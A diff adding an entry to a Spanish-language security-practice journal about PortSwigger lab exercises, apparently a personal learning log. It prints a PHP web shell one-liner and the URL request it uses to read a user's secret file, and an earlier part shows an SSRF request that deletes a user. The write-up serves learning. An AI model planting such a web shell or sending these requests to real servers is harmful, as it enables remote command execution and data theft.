@@ -162,3 +162,22 @@ stockApi=http://localhost/admin
 stockApi=http://localhost/admin/delete?username=carlos
 
 ¿Para qué servía? Ejecuta una acción administrativa (borrar al usuario carlos) usando la confianza que el servidor tiene en sí mismo, demostrando el impacto crítico del SSRF.
+
+### [25/09/2026] - Día 15: Ejecución Remota de Comandos (RCE) mediante File Upload y Cierre de Fase 1
+Hoy exploté una vulnerabilidad de subida de archivos en PortSwigger, logrando ejecutar comandos directamente en el servidor web (RCE) y obteniendo el control total de la máquina.
+
+Herramientas Utilizadas: Navegador Web, PortSwigger Academy y Terminal de Kali Linux.
+
+Práctica Real: Identifiqué que el formulario de subida de avatar no validaba correctamente la extensión ni el contenido del archivo. Creé un archivo malicioso en PHP y lo subí al servidor.
+
+Logro Técnico: Ejecuté comandos del sistema operativo a través de la URL (RCE), leí el archivo secreto de otro usuario (carlos) y resolví el laboratorio. SOLVED.
+
+🛠️ Comandos y Payloads Utilizados:
+echo "<?php echo system(\$_GET['command']); ?>" > exploit.php
+
+¿Para qué servía? Crea un archivo PHP malicioso (Web Shell). Al ejecutarse en el servidor, le dice que lea el parámetro command de la URL y ejecute ese comando en el sistema operativo.
+
+exploit.php?command=cat /home/carlos/secret
+
+¿Para qué servía? Envía el comando cat al servidor para leer el archivo secreto de Carlos y resolver el reto. Demuestra el impacto crítico de no validar los archivos subidos.
+
